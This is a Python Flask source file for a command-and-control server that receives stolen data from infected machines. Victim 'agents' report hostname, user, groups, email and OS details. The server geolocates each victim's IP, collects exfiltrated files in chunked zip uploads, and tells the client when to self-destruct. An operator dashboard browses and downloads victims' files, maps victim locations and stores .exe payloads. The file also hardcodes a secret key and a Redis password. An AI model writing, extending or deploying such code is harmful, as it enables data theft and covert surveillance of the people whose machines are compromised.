from flask import (Flask, request, jsonify, render_template,
                   send_file, send_from_directory, redirect,
                   flash, url_for, session, after_this_request)
import os, zipfile, random, requests, shutil, json, base64, tempfile
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, timedelta
from os.path import getsize
from flask_login import LoginManager, login_required, current_user, UserMixin, login_user, logout_user
from werkzeug.security import generate_password_hash, check_password_hash
from captcha.image import ImageCaptcha
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from collections import Counter
from werkzeug.utils import secure_filename


# ---------------------- Flask configuration ---------------------- #
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///site.db'
db = SQLAlchemy(app)
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'
app.config["SECRET_KEY"] = "fksdly48thergl9#8%3@45t%u9834tu95$hgui$rfg49$t67"
app.config['REMEMBER_COOKIE_DURATION'] = timedelta(hours=24)
app.config['REDIS_URL'] = 'redis://:jackass%23XX1717@localhost:6379/0'

limiter = Limiter(
    key_func=get_remote_address,
    app=app,
    storage_uri=app.config['REDIS_URL']
)

# ---------------------- Database tables ---------------------- #


class Agents(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    uid = db.Column(db.String(80), unique=True)
    hostname = db.Column(db.String(80))
    username = db.Column(db.String(80))
    local_ip = db.Column(db.String(80))
    local_groups = db.Column(db.String(360))
    email = db.Column(db.String(120))
    os_name = db.Column(db.String(80))
    os_version = db.Column(db.String(80))
    os_arch = db.Column(db.String(120))
    file_metadata = db.Column(db.Text)
    bytes_received = db.Column(db.Integer)
    file_path = db.Column(db.String(500))
    agent_creation = db.Column(db.DateTime)
    file_addition = db.Column(db.DateTime)
    upload_complete = db.Column(db.Boolean, default=False)
    # geolocation data
    public_ip = db.Column(db.String(120))
    city = db.Column(db.String(120))
    region = db.Column(db.String(120))
    country = db.Column(db.String(120))
    postal = db.Column(db.String(120))
    latitude = db.Column(db.String(120))
    longitude = db.Column(db.String(120))


class Administrator(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(128), nullable=False)

    def set_password(self, password):
        self.password = generate_password_hash(password)

    def check_password(self, password):
        return check_password_hash(self.password, password)

    def is_active(self):
        return True


class Executables(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    filename = db.Column(db.String(150), nullable=False)
    description = db.Column(db.Text, nullable=True)
    binary_data = db.Column(db.LargeBinary, nullable=False)
    public = db.Column(db.Boolean)
    creation_date = db.Column(db.DateTime, default=datetime.now().astimezone())
    modification_date = db.Column(db.DateTime)


with app.app_context():
    #db.drop_all()
    db.create_all()


# ---------------------- Public Routes ---------------------- #

@app.route('/', methods=["GET"])
@limiter.limit('100 per 1 hour')
def index():
    return render_template('index.html')


def is_zip_valid(filepath):
    try:
        with zipfile.ZipFile(filepath, 'r') as zip_ref:
            bad_file = zip_ref.testzip()
            if bad_file:
                return False
            return True
    except zipfile.BadZipFile:
        return False


def geolocation_id(ip):
    location = {}
    try:
        url = f'https://ipapi.co/{ip}/json/'
        resp = requests.get(url=url, timeout=10).json()
        location = {
            "public_ip": ip,
            "city": resp.get("city"),
            "region": resp.get("region"),
            "country": resp.get("country_name"),
            "postal": resp.get("postal"),
            "latitude": resp.get("latitude"),
            "longitude": resp.get("longitude"),
        }
    except: pass
    return location


@app.route('/add_agent', methods=['POST'])
@limiter.limit("100 per 1 hour")
def add_agent():
    try:
        if 'HTTP_X_FORWARDED_FOR' in request.environ:
            user_ip = request.environ['HTTP_X_FORWARDED_FOR'].split(',')[0].strip()
        else:
            user_ip = request.remote_addr

        data = request.json
        agent = Agents.query.filter_by(uid=data.get('uid')).first()
        if agent and agent.file_metadata is not None:
            return jsonify({'message': 'agent already exist'}), 400
        geolocation = geolocation_id(user_ip)
        print(geolocation)

        strJson = json.dumps(data.get('file_metadata'))

        new_agent = Agents(
            uid=data.get('uid', None),
            hostname=data.get('hostname', None),
            username=data.get('username', None),
            local_ip=data.get('local_ip', None),
            local_groups=data.get('local_groups', None),
            email=data.get('email', None),
            os_name=data.get('os_name', None),
            os_version=data.get('os_version', None),
            os_arch=data.get('os_arch', None),
            file_metadata=strJson,
            agent_creation=datetime.now().astimezone(),
            public_ip=geolocation.get("public_ip", None),
            city=geolocation.get("city", None),
            region=geolocation.get("region", None),
            country=geolocation.get("country", None),
            postal=geolocation.get("postal", None),
            latitude=geolocation.get("latitude", None),
            longitude=geolocation.get("longitude", None),
        )

        db.session.add(new_agent)
        db.session.commit()
    except Exception as e:
        app.logger.error(f"Error occurred: {e}")
        db.session.rollback()

    return jsonify({'message': 'created'}), 201


@app.route('/upload', methods=['POST'])
def upload_file():
    # Extracting the base64 encoded file data and uid from the JSON payload
    file = request.json.get('file_data')
    uid = request.json.get('uid')

    # Convert the base64 encoded file data back to bytes:
    file_bytes = base64.b64decode(file)

    agent = Agents.query.filter_by(uid=uid).first()

    if not uid or not agent:
        app.logger.error("Invalid or missing UID")
        return jsonify({"error": "Invalid or missing UID"}), 403

    if not file_bytes:
        app.logger.error("No file data in the request")
        return jsonify({"error": "No file data in the request"}), 400

    metadata = json.loads(agent.file_metadata)
    chunk_ranges = metadata['chunks']
    bytes_received = agent.bytes_received or 0

    current_chunk_range = None
    for chunk, byte_range in chunk_ranges.items():
        if bytes_received in range(byte_range[0], byte_range[1] + 1):
            current_chunk_range = byte_range
            break

    if not current_chunk_range:
        app.logger.error("Received unexpected chunk or out of order data.")
        return jsonify({"error": "Received unexpected chunk"}), 400

    unique_filename = f"{uid}.zip"
    filepath = os.path.join(os.getcwd(), "files", unique_filename)

    # If this is the first chunk, create the file and update the file_path column:
    if bytes_received == 0:
        with open(filepath, 'wb') as f:
            f.write(file_bytes)
        agent.file_path = filepath

    else:
        # If not the first chunk, append to the file:
        with open(filepath, 'ab') as f:
            f.write(file_bytes)

    if agent.bytes_received is None:
        agent.bytes_received = 0
    agent.bytes_received += len(file_bytes)
    db.session.commit()

    # if the entire file has been uploaded, then extract the zip to a folder, and delete the zip:
    if agent.bytes_received >= metadata['total_size']:
        if is_zip_valid(filepath):
            unzip_dir = os.path.join(os.getcwd(), "files", uid)
            if not os.path.exists(unzip_dir):
                os.makedirs(unzip_dir)
            with zipfile.ZipFile(filepath, 'r') as zip_ref:
                zip_ref.extractall(unzip_dir)
            os.remove(filepath)

            agent.file_addition = datetime.now().astimezone()
            agent.file_path = unzip_dir
            agent.upload_complete = True
            db.session.commit()

            return jsonify({"message": "File uploaded and extracted successfully."}), 200
        else:
            return jsonify({"error": "Uploaded failed or file is corrupt."}), 400
    return jsonify({"message": "Chunk received successfully."}), 206


@app.route('/file_status', methods=['POST'])
def file_status():
    data = request.json
    uid = data.get('uid')
    agent = Agents.query.filter_by(uid=uid).first()

    if not uid or not agent:
        app.logger.error("Invalid or missing UID")
        return jsonify({"error": "Invalid or missing UID"}), 403

    metadata = json.loads(agent.file_metadata)
    total_size = metadata['total_size']
    bytes_received = agent.bytes_received or 0

    # If upload is complete, return completed status so that the client can self-destruct:
    if bytes_received >= total_size:
        return jsonify({"status": "completed", "message": "All chunks uploaded."}), 200

    # Sort the chunks by their numerical key value:
    sorted_chunks = sorted(metadata['chunks'].items(), key=lambda x: int(x[0]))

    # Determine the next chunk to send based on bytes_received:
    next_chunk = None
    next_chunk_range = None
    for chunk, byte_range in sorted_chunks:
        if bytes_received < byte_range[1]:
            next_chunk = chunk
            next_chunk_range = byte_range
            break

    # If there is a next_chunk, return its start and end bytes separately:
    if next_chunk_range:
        return jsonify({
            "status": "incomplete",
            "next_chunk": next_chunk,
            "start_byte": next_chunk_range[0],
            "end_byte": next_chunk_range[1],
            "bytes_received": bytes_received
        }), 200
    else:
        return jsonify({"status": "incomplete", "next_chunk": next_chunk, "bytes_received": bytes_received}), 200


@app.route('/login', methods=['GET', 'POST'])
@limiter.limit("100 per 1 hour")
def login():
    if current_user.is_authenticated:
        return redirect(url_for('command'))

    # CAPTCHA Handling for POST request
    if request.method == "POST":
        captcha_response = request.form.get("captcha_response", "").strip().lower()
        stored_captcha = session.get("captcha_answer", "").lower()

        if not captcha_response or captcha_response != stored_captcha:
            flash('Invalid CAPTCHA answer.', 'danger')
            return redirect(url_for('login'))

        username = request.form.get("username")
        password = request.form.get("password")
        remember = True if request.form.get("remember_me") else False

        user = Administrator.query.filter_by(username=username).first()
        if user and check_password_hash(user.password, password):
            login_user(user, remember=remember)
            return redirect(url_for('command'))
        else:
            flash('Invalid username or password.', 'danger')
            return redirect(url_for('login'))

    # CAPTCHA Handling for GET request
    captcha_chars = 'ab23456'
    captcha_answer = ''.join(random.choices(captcha_chars, k=4))
    session['captcha_answer'] = captcha_answer

    image_captcha = ImageCaptcha()
    captcha_path = os.path.join("static", "captcha", f"captcha_{captcha_answer}.png")
    image_captcha.write(captcha_answer, captcha_path)

    # return the login page with the path to the captcha image
    return render_template("login.html",
                           captcha_image_url=url_for('static', filename=f'captcha/captcha_{captcha_answer}.png'))


@login_manager.user_loader
def load_user(user_id):
    return Administrator.query.get(int(user_id))


@app.errorhandler(429)
def ratelimit_error(e):
    return jsonify(error="ratelimit exceeded", message=str(e.description)), 429


# ---------------------- Protected Routes ---------------------- #

@app.route('/command')
@login_required
def command():
    agents = Agents.query.all()
    return render_template('command.html', active='command', agents=agents)


def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ['exe']


def get_total_size(path):
    total = 0
    if os.path.isfile(path):
        total += os.path.getsize(path)
    elif os.path.isdir(path):
        for item in os.listdir(path):
            total += get_total_size(os.path.join(path, item))
    return total


@app.route('/sorted_agents')
@login_required
def sorted_agents():
    sortby = request.args.get('sortby', 'local_ip')
    query = request.args.get('query', '')
    agents_query = Agents.query

    if query:
        # sorting by local IP
        if sortby == 'local_ip':
            search_value = query.rstrip('%')
            agents_query = agents_query.filter(Agents.local_ip.like(f"{search_value}%"))
        # For country, region and city:
        elif sortby in ['country', 'region', 'city']:
            search_value = query.lower()
            agents_query = agents_query.filter(getattr(Agents, sortby).ilike(f"%{search_value}%"))
    agents = agents_query.order_by(getattr(Agents, sortby)).all()

    return render_template('command.html', agents=agents)


@app.route('/view_files/<uid>', defaults={'subpath': None}, methods=['GET'])
@app.route('/view_files/<uid>/<path:subpath>', methods=['GET'])
@login_required
def view_files(uid, subpath=None):
    agent = Agents.query.filter_by(uid=uid).first()
    if not agent:
        return "Agent not found", 404

    if subpath:
        base_path = os.path.join(agent.file_path, subpath)
    else:
        base_path = agent.file_path

    if not os.path.exists(base_path):
        return "File or directory not found", 404

    if os.path.isfile(base_path):
        # If base_path is a file, send it for viewing
        return send_file(base_path, mimetype='text/plain')


    files = []
    directories = []

    for item in os.listdir(base_path):
        if os.path.isdir(os.path.join(base_path, item)):
            directories.append(item)
        else:
            files.append(item)

    directories.sort()
    files.sort()

    # Breadcrumbs
    breadcrumbs = []
    if subpath:
        parts = subpath.split('/')
        for i, part in enumerate(parts):
            breadcrumbs.append({
                'name': part,
                'path': '/'.join(parts[:i+1])
            })

    # size of files inside one directory
    total_size = 0
    num_files = len(files)
    for file in files:
        total_size += getsize(os.path.join(base_path, file))

    # Size of the root directory and everything in it
    base_size = get_total_size(base_path)
    total_num_files = 0  # reset this variable
    for dirpath, dirnames, filenames in os.walk(base_path):
        total_num_files += len(filenames)

    total_files = sum([len(files) for _, _, files in os.walk(base_path)])

    # Collecting all starting characters from directories and files
    all_chars = set(dir[0].lower() for dir in directories)
    all_chars.update(file[0].lower() for file in files)
    all_chars = sorted(list(all_chars))

    return render_template("explorer.html", directories=directories, files=files, agent=agent, subpath=subpath,
                           breadcrumbs=breadcrumbs, total_size=total_size, num_files=num_files, total_files=total_files,
                           base_size=base_size, all_chars=all_chars, total_num_files=total_num_files)


@app.route('/download_file/<uid>/<path:subpath>')
@login_required
def download_file(uid, subpath):
    agent = Agents.query.filter_by(uid=uid).first()
    if not agent:
        return "Agent not found", 404

    file_path = os.path.join(agent.file_path, subpath)
    if not os.path.exists(file_path):
        return jsonify({"error": "File or directory not found"}), 404

    # If it's a file, download as attachment
    if os.path.isfile(file_path):
        return send_from_directory(agent.file_path, subpath, as_attachment=True)

    # If it's a directory, zip it before sending
    if os.path.isdir(file_path):
        # Create a temporary file to store the zip archive
        temp_dir = tempfile.mkdtemp()
        zip_name = os.path.basename(subpath) + '.zip'
        zip_path = os.path.join(temp_dir, zip_name)

        # Zip the directory
        shutil.make_archive(zip_path.replace('.zip', ''), 'zip', file_path)

        # Ensure the temp file is removed after sending the zip file
        @after_this_request
        def cleanup(response):
            shutil.rmtree(temp_dir)
            return response

        return send_file(zip_path, as_attachment=True, download_name=zip_name)
    return jsonify({"error": "Unexpected error"}), 500


@app.route('/download_agent/<uid>')
@login_required
def download_agent(uid):
    agent = Agents.query.filter_by(uid=uid).first()
    if not agent:
        return "Agent not found", 404

    file_path = agent.file_path

    if not os.path.isdir(file_path):
        return "Directory not found", 404

    # Name the zip file after the agent's UID
    zip_name = f"{agent.uid}.zip"
    # Create a temporary directory to store the zip file
    temp_dir = tempfile.mkdtemp()
    zip_path = os.path.join(temp_dir, zip_name)

    # Render the HTML template with the agent details
    agent_details_html = render_template('agent_details.html', agent=agent)
    # Write the HTML content to a file in the temp directory
    details_file_path = os.path.join(temp_dir, 'agent_details.html')
    with open(details_file_path, 'w') as f:
        f.write(agent_details_html)

    # Add the HTML file to the existing file_path before zipping
    shutil.copy(details_file_path, os.path.join(file_path, 'agent_details.html'))

    # Create the zip file including the agent_details.html
    shutil.make_archive(zip_path.replace('.zip', ''), 'zip', file_path)

    # Remove the HTML file added in the agent's file_path
    os.remove(os.path.join(file_path, 'agent_details.html'))

    @after_this_request
    def cleanup(response):
        shutil.rmtree(temp_dir)
        return response

    return send_file(zip_path, as_attachment=True, download_name=zip_name)


@app.route('/delete_agent/<int:agent_id>', methods=['GET'])
@login_required
def delete_agent(agent_id):
    agent = Agents.query.get(agent_id)
    if agent:
        # Delete the agent's folder if it exists
        folder_path = agent.file_path
        if folder_path and os.path.exists(folder_path):
            shutil.rmtree(folder_path)
        # Delete the agent's entry from the database
        db.session.delete(agent)
        db.session.commit()
        flash('Agent and associated data deleted successfully.', 'success')
    else:
        flash('Error deleting agent.', 'danger')

    return jsonify({"status": "done"})


@app.route('/map', methods=['GET'])
@login_required
def agent_map():
    agents = Agents.query.all()
    country_counts = Counter(agent.country for agent in agents if agent.country)
    sorted_countries = sorted(country_counts.items(), key=lambda item: item[1], reverse=True)

    city_counts = Counter(agent.city for agent in agents if agent.city)
    sorted_cities = sorted(city_counts.items(), key=lambda item: item[1], reverse=True)

    return render_template("map.html", countries=sorted_countries, cities=sorted_cities, active='agent_map')


@app.route('/get_agents', methods=['GET'])
@login_required
def get_agents():
    agents = Agents.query.all()
    agent_list = [{'hostname': agent.hostname, 'latitude': agent.latitude, 'longitude': agent.longitude} for agent in agents]
    return jsonify(agent_list)


@app.route('/executables', methods=['GET', 'POST'])
def executables():
    if request.method == 'POST':
        file = request.files.get('file')
        if not file:
            return jsonify({'error': 'No file part'}), 400
        filename = secure_filename(request.form.get('filename', '')) + '.exe'
        description = request.form.get('description', '')

        # Explicitly process 'public' value from the form
        public_value = request.form.get('public', 'False')  # Default to 'False' if not provided
        public = True if public_value == 'True' else False  # Convert to boolean

        if file and allowed_file(filename):
            binary_data = file.read()

            new_exec = Executables(
                filename=filename,
                description=description,
                binary_data=binary_data,
                public=public,
                creation_date=datetime.now().astimezone(),
            )
            db.session.add(new_exec)
            db.session.commit()

            return jsonify({'message': 'File uploaded successfully', 'id': new_exec.id}), 200

    execs = Executables.query.all()
    return render_template('executables.html', active='executables', executables=execs)


@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

